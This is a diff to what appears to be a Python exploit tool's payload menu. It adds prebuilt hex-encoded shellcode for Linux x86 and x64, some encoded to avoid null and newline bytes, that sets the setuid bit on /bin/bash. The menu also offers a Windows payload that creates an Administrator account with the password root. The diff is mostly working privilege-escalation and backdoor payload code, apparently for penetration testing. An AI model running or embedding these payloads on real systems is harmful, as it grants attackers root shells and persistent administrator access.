@@ -269,7 +269,14 @@ class exploit:
                 # format:
                 # description: (payload, args, bad_chars)
                 available = {
-                    "linux: chmod u+s /bin/bash (prebuilt, no msfvenom required)":
+                    "linux x86: chmod u+s /bin/bash -- no specified bad chars " + \
+                    "(prebuilt, no msfvenom required)":
+                    ("Preset", "Preset", "Preset"),
+                    "linux x86: chmod u+s /bin/bash -- " + r"-b \x00\x0a\x0d" + \
+                    "(prebuilt, no msfvenom required)":
+                    ("Preset", "Preset", "Preset"),
+                    "linux x64: chmod u+s /bin/bash -- " + r"-b \x00\x0a\x0d" + \
+                    "(prebuilt, no msfvenom required)":
                     ("Preset", "Preset", "Preset"),
                     "windows: add Administrator account (u:root/p:root) (prebuilt, no " +
                     "msfvenom required)": ("Preset", "Preset", "Preset"),
@@ -285,7 +292,7 @@ class exploit:
                     print(f"{i} : {keys[i]}")
                 options = [str(i) for i in range(len(keys))]
                 options.append("b")
-                response = get_input("\nEnter your selection: (0,2,...,n):\nOr, enter \"b\" to go back\n",
+                response = get_input("\nEnter your selection: (0,1,...,n):\nOr, enter \"b\" to go back\n",
                                      options)
                 if response == "b":
                     continue
@@ -295,6 +302,18 @@ class exploit:
                         "2696e2f6261736800575389e1cd80"
                     break
                 elif response == "1":
+                    self.shellcode = \
+                        "dbc3bdce613c86d97424f45f2bc9b10e83c704316f16036f16e23b0b37de5a9e21b6717c27a1e1ad4" + \
+                        "446f1d985f49877531b086077dcac701bb4c11fbf646ccb4c45a169daeb920f7d8784cf2a34dd3119" + \
+                        "3a"
+                    break
+                elif response == "2":
+                    self.shellcode = \
+                        "4831c94881e9f8ffffff488d05efffffff48bb07c07ca0764837e248315827482df8ffffffe2f46df" + \
+                        "b24393ef318806eae53d31e4864aa8e27148d154837aa8e262e48624837e264a811cf126842c974e0" + \
+                        "53c21f26188066b314a0201f7f6be1cf79a0764837e2"
+                    break
+                elif response == "3":
                     self.shellcode = \
                         "ba19a5b4d8d9cbd97424f45f2bc9b14783effc31570f035716474124c005aad5106a223021aa5030" + \
                         "111a12149dd1768d16975ea29f12b98d200ef98ca24d2e6f9b9d236edcc0ce22b58f7dd3b2da" + \
